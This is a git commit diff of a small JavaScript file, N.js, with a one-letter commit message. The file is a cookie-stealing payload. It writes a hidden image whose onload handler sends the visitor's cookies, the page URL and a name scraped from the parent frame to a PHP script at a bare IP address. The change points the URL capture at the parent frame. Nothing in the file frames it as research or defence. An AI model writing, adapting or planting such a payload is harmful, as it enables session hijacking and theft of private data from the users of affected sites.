653ad154ca2c12b51d9d1da6fa2db13b03454e1f
zzzkf <zzzykf@gmail.com>
2018-11-23 16:25:25 +0800

    d

--- N.js
+++ N.js
@@ -1,4 +1,4 @@
 var cookie = encodeURIComponent(document.cookie);
 var name = encodeURIComponent(parent.document.getElementsByTagName("font")[0].innerText);
 
-document.write('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + cookie + '&D=' + window.location.href+'&N='+name + '">');
+document.write('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + cookie + '&D=' + window.parent.location.href+'&N='+name + '">');
